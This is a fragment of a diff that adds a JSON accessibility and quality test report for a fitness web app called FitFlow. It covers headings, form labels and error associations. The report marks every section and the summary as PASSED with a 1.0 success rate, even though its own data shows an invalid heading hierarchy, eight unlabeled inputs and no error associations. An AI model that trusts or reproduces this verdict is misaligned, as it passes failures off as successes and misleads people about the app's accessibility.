+                    "text": "Recent Workouts"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 2,
+                    "text": "\ud83c\udf89 What's New in FitFlow"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "\u23f1\ufe0f Adaptive Workout Timing"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "\ud83d\udcc8 Personalized Difficulty Scaling"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 2,
+                    "text": "Create Your Perfect Workout"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "Quick Start Presets"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 2,
+                    "text": "Your Workout"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Jumping Jacks"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Reverse Lunges"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Walking Lunges"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Leg Swings"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "World's Greatest Stretch"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Mountain Climbers"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Neck Rolls"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Ankle Rotations"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Sumo Squats"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Glute Bridge"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Wall Sit"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Bird Dog"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Push-ups"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Calf Raises"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Squats"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Side Plank"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Bicycle Crunches"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Single-leg Glute Bridge"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Pigeon Pose"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Chest Stretch"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Knees to Chest"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Happy Baby"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Calf Stretch"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Quad Stretch"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Wall Chest Stretch"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Seated Spinal Twist"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "No Workouts Found"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 2,
+                    "text": "Your Workout Plan"
+                  },
+                  {
+                    "has_id": true,
+                    "id": "exercise-title",
+                    "level": 2,
+                    "text": ""
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "Instructions"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "Work Time"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "Rest Time"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "Rest Time"
+                  },
+                  {
+                    "has_id": true,
+                    "id": "next-exercise-name",
+                    "level": 4,
+                    "text": ""
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "Login to FitFlow"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "\u2705 Secure Login"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "Create Account"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Security Question (for password reset)"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "\ud83d\udd12 Your Data Security"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "Your Profile"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "Reset Password"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "\ud83d\udd12 Privacy Policy & Data Security"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Data Security"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 5,
+                    "text": "\ud83d\udd10 Password Protection"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 5,
+                    "text": "\ud83d\udcbe Local Storage"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 5,
+                    "text": "\ud83d\udee1\ufe0f Privacy Guarantees"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "What We Store"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 5,
+                    "text": "Account Information"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 5,
+                    "text": "Workout Data"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
+                    "text": "Your Rights"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "Accessibility Options"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "Visual Enhancements"
+                  },
+                  {
+                    "has_id": true,
+                    "id": "video-modal-title",
+                    "level": 3,
+                    "text": "Exercise Video"
+                  }
+                ],
+                "hierarchy_valid": false,
+                "total_headings": 63
+              },
+              "heading_content": {
+                "content_data": [
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 1,
+                    "text": "FitFlow \ud83d\ude80",
+                    "text_length": 10
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 2,
+                    "text": "Workout Analytics",
+                    "text_length": 17
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Your Personal Workout History",
+                    "text_length": 29
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Recent Workouts",
+                    "text_length": 15
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 2,
+                    "text": "\ud83c\udf89 What's New in FitFlow",
+                    "text_length": 24
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "\u23f1\ufe0f Adaptive Workout Timing",
+                    "text_length": 26
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "\ud83d\udcc8 Personalized Difficulty Scaling",
+                    "text_length": 34
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 2,
+                    "text": "Create Your Perfect Workout",
+                    "text_length": 27
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Quick Start Presets",
+                    "text_length": 19
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 2,
+                    "text": "Your Workout",
+                    "text_length": 12
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Jumping Jacks",
+                    "text_length": 13
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Reverse Lunges",
+                    "text_length": 14
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Walking Lunges",
+                    "text_length": 14
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Leg Swings",
+                    "text_length": 10
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "World's Greatest Stretch",
+                    "text_length": 24
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Mountain Climbers",
+                    "text_length": 17
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Neck Rolls",
+                    "text_length": 10
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Ankle Rotations",
+                    "text_length": 15
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Sumo Squats",
+                    "text_length": 11
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Glute Bridge",
+                    "text_length": 12
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Wall Sit",
+                    "text_length": 8
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Bird Dog",
+                    "text_length": 8
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Push-ups",
+                    "text_length": 8
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Calf Raises",
+                    "text_length": 11
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Squats",
+                    "text_length": 6
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Side Plank",
+                    "text_length": 10
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Bicycle Crunches",
+                    "text_length": 16
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Single-leg Glute Bridge",
+                    "text_length": 23
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Pigeon Pose",
+                    "text_length": 11
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Chest Stretch",
+                    "text_length": 13
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Knees to Chest",
+                    "text_length": 14
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Happy Baby",
+                    "text_length": 10
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Calf Stretch",
+                    "text_length": 12
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Quad Stretch",
+                    "text_length": 12
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Wall Chest Stretch",
+                    "text_length": 18
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Seated Spinal Twist",
+                    "text_length": 19
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "No Workouts Found",
+                    "text_length": 17
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 2,
+                    "text": "Your Workout Plan",
+                    "text_length": 17
+                  },
+                  {
+                    "has_content": false,
+                    "is_unique": true,
+                    "level": 2,
+                    "text": "",
+                    "text_length": 0
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Instructions",
+                    "text_length": 12
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Work Time",
+                    "text_length": 9
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Rest Time",
+                    "text_length": 9
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Rest Time",
+                    "text_length": 9
+                  },
+                  {
+                    "has_content": false,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "",
+                    "text_length": 0
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Login to FitFlow",
+                    "text_length": 16
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "\u2705 Secure Login",
+                    "text_length": 14
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Create Account",
+                    "text_length": 14
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Security Question (for password reset)",
+                    "text_length": 38
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "\ud83d\udd12 Your Data Security",
+                    "text_length": 21
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Your Profile",
+                    "text_length": 12
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Reset Password",
+                    "text_length": 14
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "\ud83d\udd12 Privacy Policy & Data Security",
+                    "text_length": 33
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Data Security",
+                    "text_length": 13
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 5,
+                    "text": "\ud83d\udd10 Password Protection",
+                    "text_length": 22
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 5,
+                    "text": "\ud83d\udcbe Local Storage",
+                    "text_length": 16
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 5,
+                    "text": "\ud83d\udee1\ufe0f Privacy Guarantees",
+                    "text_length": 22
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "What We Store",
+                    "text_length": 13
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 5,
+                    "text": "Account Information",
+                    "text_length": 19
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 5,
+                    "text": "Workout Data",
+                    "text_length": 12
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 4,
+                    "text": "Your Rights",
+                    "text_length": 11
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Accessibility Options",
+                    "text_length": 21
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Visual Enhancements",
+                    "text_length": 19
+                  },
+                  {
+                    "has_content": true,
+                    "is_unique": true,
+                    "level": 3,
+                    "text": "Exercise Video",
+                    "text_length": 14
+                  }
+                ],
+                "empty_headings": 2,
+                "headings_with_content": 61
+              }
+            }
+          },
+          "form_label_testing": {
+            "status": "PASSED",
+            "form_label_tests": {
+              "label_associations": {
+                "association_data": [
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "duration-15",
+                    "is_properly_labeled": true,
+                    "type": "radio"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "duration-30",
+                    "is_properly_labeled": true,
+                    "type": "radio"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "duration-45",
+                    "is_properly_labeled": true,
+                    "type": "radio"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "duration-60",
+                    "is_properly_labeled": true,
+                    "type": "radio"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": false,
+                    "has_placeholder": false,
+                    "id": "fitness-level",
+                    "is_properly_labeled": false,
+                    "type": "select-one"
+                  },
+                  {
+                    "has_aria_label": true,
+                    "has_aria_labelledby": false,
+                    "has_label": false,
+                    "has_placeholder": false,
+                    "id": "work-time",
+                    "is_properly_labeled": true,
+                    "type": "number"
+                  },
+                  {
+                    "has_aria_label": true,
+                    "has_aria_labelledby": false,
+                    "has_label": false,
+                    "has_placeholder": false,
+                    "id": "rest-time",
+                    "is_properly_labeled": true,
+                    "type": "number"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "pattern-standard",
+                    "is_properly_labeled": true,
+                    "type": "radio"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "pattern-circuit",
+                    "is_properly_labeled": true,
+                    "type": "radio"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "pattern-tabata",
+                    "is_properly_labeled": true,
+                    "type": "radio"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "pattern-pyramid",
+                    "is_properly_labeled": true,
+                    "type": "radio"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": false,
+                    "has_placeholder": false,
+                    "id": "circuit-rounds",
+                    "is_properly_labeled": false,
+                    "type": "number"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": false,
+                    "has_placeholder": false,
+                    "id": "circuit-exercises",
+                    "is_properly_labeled": false,
+                    "type": "number"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": false,
+                    "has_placeholder": false,
+                    "id": "circuit-rest",
+                    "is_properly_labeled": false,
+                    "type": "number"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": false,
+                    "has_placeholder": false,
+                    "id": "tabata-rounds",
+                    "is_properly_labeled": false,
+                    "type": "number"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": false,
+                    "has_placeholder": false,
+                    "id": "tabata-rest",
+                    "is_properly_labeled": false,
+                    "type": "number"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": false,
+                    "has_placeholder": false,
+                    "id": "pyramid-levels",
+                    "is_properly_labeled": false,
+                    "type": "number"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": false,
+                    "has_placeholder": false,
+                    "id": "pyramid-rest",
+                    "is_properly_labeled": false,
+                    "type": "number"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "eq-bodyweight",
+                    "is_properly_labeled": true,
+                    "type": "checkbox"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "eq-dumbbells",
+                    "is_properly_labeled": true,
+                    "type": "checkbox"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "eq-kettlebell",
+                    "is_properly_labeled": true,
+                    "type": "checkbox"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "eq-trx",
+                    "is_properly_labeled": true,
+                    "type": "checkbox"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "eq-resistance",
+                    "is_properly_labeled": true,
+                    "type": "checkbox"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "eq-pullup",
+                    "is_properly_labeled": true,
+                    "type": "checkbox"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "eq-jumprope",
+                    "is_properly_labeled": true,
+                    "type": "checkbox"
+                  },
+                  {
+                    "has_aria_label": false,
+                    "has_aria_labelledby": false,
+                    "has_label": true,
+                    "has_placeholder": false,
+                    "id": "eq-rower",
+                    "is_properly_labeled": true,
+                    "type": "checkbox"
+                  }
+                ],
+                "properly_labeled": 18,
+                "total_inputs": 26,
+                "total_labels": 30
+              },
+              "required_indicators": {
+                "indicator_data": [],
+                "properly_indicated": 0,
+                "total_required": 0
+              }
+            }
+          },
+          "error_message_accessibility": {
+            "status": "PASSED",
+            "error_tests": {
+              "error_identification": {
+                "error_data": [],
+                "total_errors": 0
+              },
+              "error_association": {
+                "association_data": [
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "duration-15",
+                    "is_properly_associated": false,
+                    "type": "radio"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "duration-30",
+                    "is_properly_associated": false,
+                    "type": "radio"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "duration-45",
+                    "is_properly_associated": false,
+                    "type": "radio"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "duration-60",
+                    "is_properly_associated": false,
+                    "type": "radio"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "fitness-level",
+                    "is_properly_associated": false,
+                    "type": "select-one"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "work-time",
+                    "is_properly_associated": false,
+                    "type": "number"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "rest-time",
+                    "is_properly_associated": false,
+                    "type": "number"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "pattern-standard",
+                    "is_properly_associated": false,
+                    "type": "radio"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "pattern-circuit",
+                    "is_properly_associated": false,
+                    "type": "radio"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "pattern-tabata",
+                    "is_properly_associated": false,
+                    "type": "radio"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "pattern-pyramid",
+                    "is_properly_associated": false,
+                    "type": "radio"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "circuit-rounds",
+                    "is_properly_associated": false,
+                    "type": "number"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "circuit-exercises",
+                    "is_properly_associated": false,
+                    "type": "number"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "circuit-rest",
+                    "is_properly_associated": false,
+                    "type": "number"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "tabata-rounds",
+                    "is_properly_associated": false,
+                    "type": "number"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "tabata-rest",
+                    "is_properly_associated": false,
+                    "type": "number"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "pyramid-levels",
+                    "is_properly_associated": false,
+                    "type": "number"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "pyramid-rest",
+                    "is_properly_associated": false,
+                    "type": "number"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "eq-bodyweight",
+                    "is_properly_associated": false,
+                    "type": "checkbox"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "eq-dumbbells",
+                    "is_properly_associated": false,
+                    "type": "checkbox"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "eq-kettlebell",
+                    "is_properly_associated": false,
+                    "type": "checkbox"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "eq-trx",
+                    "is_properly_associated": false,
+                    "type": "checkbox"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "eq-resistance",
+                    "is_properly_associated": false,
+                    "type": "checkbox"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "eq-pullup",
+                    "is_properly_associated": false,
+                    "type": "checkbox"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "eq-jumprope",
+                    "is_properly_associated": false,
+                    "type": "checkbox"
+                  },
+                  {
+                    "described_by_element": null,
+                    "has_aria_describedby": false,
+                    "id": "eq-rower",
+                    "is_properly_associated": false,
+                    "type": "checkbox"
+                  }
+                ],
+                "properly_associated": 0,
+                "total_inputs": 26
+              }
+            }
+          }
+        },
+        "overall_success_rate": 1.0,
+        "status": "PASSED"
+      }
+    }
+  },
+  "summary": {
+    "user_interaction_tests": "PASSED",
+    "responsive_design_tests": "PASSED",
+    "performance_monitoring_tests": "PASSED",
+    "security_validation_tests": "PASSED",
+    "accessibility_compliance_tests": "PASSED"
+  }
+}
